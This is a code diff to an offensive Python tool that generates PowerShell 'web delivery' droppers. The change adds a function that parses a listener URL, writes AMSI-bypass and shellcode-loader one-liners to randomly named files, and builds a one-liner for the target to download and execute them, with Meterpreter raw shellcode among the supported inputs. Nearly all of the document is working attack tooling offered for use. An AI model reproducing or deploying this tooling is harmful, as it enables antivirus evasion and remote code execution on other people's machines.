@@ -8,6 +8,7 @@ import gzip
 import base64
 from pathlib import Path
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+from urllib.parse import urlparse
 
 
     
@@ -90,11 +91,75 @@ def generatePayloads(binary, binaryArgs, rawShellCode):
     return amsiOneLiner, shellcodeLoaderOneliner
 
 
+def getHelpExploration():
+        helpMessage = 'PowershellWebDelivery generate a powershell one liner to download and execute a payload from a web server\n'
+        helpMessage += 'Usage:  Dropper PowershellWebDelivery listenerDownload listenerBeacon\n'
+        return helpMessage
+
+
+def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):
+
+        if url[-1:] == "/":
+                url = url[:-1]
+
+        print('[+] Parse url')
+        parsed_url = urlparse(url)
+        schema = parsed_url.scheme
+        ip = parsed_url.hostname
+        port = parsed_url.port if parsed_url.port else (443 if schema == "https" else 80)
+
+        print(" Schema:", schema)
+        print(" IP Address:", ip)
+        print(" Port:", port)
+
+        # Generate payloads
+        droppersPath = []
+        shellcodesPath = []
+        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode)
+
+        filenameAmsi = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+        amsiOneLinerPath = os.path.join(Path(__file__).parent, 'bin')
+        amsiOneLinerPath = os.path.join(amsiOneLinerPath, filenameAmsi)
+        
+        # Write one liner to file
+        f = open(amsiOneLinerPath, "w")
+        f.truncate(0) 
+        f.write(amsiOneLiner)
+        f.close()
+
+        filenameShellcode = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+        shellcodeLoaderOnelinerPath = os.path.join(Path(__file__).parent, 'bin')
+        shellcodeLoaderOnelinerPath = os.path.join(shellcodeLoaderOnelinerPath, filenameShellcode)
+        
+        # Write shellcode loader to file
+        f = open(shellcodeLoaderOnelinerPath, "w")
+        f.truncate(0) 
+        f.write(shellcodeLoaderOneliner)
+        f.close()
+        
+        # Gnerate oneliner to run on the target
+        oneliner = generateOneLiner(ip, str(port), schema, parsed_url.path + "/" + filenameAmsi, parsed_url.path + "/" + filenameShellcode)
+
+        shellcodesPath.append(amsiOneLinerPath)
+        shellcodesPath.append(shellcodeLoaderOnelinerPath)
+
+        print(droppersPath)
+        print(shellcodesPath)
+        print(oneliner)
+
+        return droppersPath, shellcodesPath, oneliner
+
+
+helpMessage = 'PowershellWebDelivery generate a powershell one liner to download and execute a payload from a web server\n'
+helpMessage += 'Usage:  Dropper PowershellWebDelivery listenerDownload listenerBeacon\n'
+helpMessage += 'Exemple:\n'
+helpMessage += 'PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"'
+helpMessage += 'PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./met.raw'
+
+
 def main(argv):
     if(len(argv)<6):
-            print ('On Windows:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
-            print ('On linux:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
-            print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
+            print(helpMessage)
             exit()
 
     ip=""
@@ -106,9 +171,7 @@ def main(argv):
     opts, args = getopt.getopt(argv,"hi:p:b:a:r:",["ip=","port=","binary=","args=","raw="])
     for opt, arg in opts:
             if opt == '-h':
-                    print ('On Windows:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
-                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
-                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
+                    print(helpMessage)
                     sys.exit()
             elif opt in ("-b", "--binary"):
                     binary = arg
@@ -137,7 +200,7 @@ def main(argv):
     f2.write(shellcodeLoaderOneliner)
     f2.close()
 
-    oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1")
+    oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="/payloadAmsi.ps1", shellcodeLoaderPath="/payloadShellcode.ps1")
 
     print(oneliner)
     
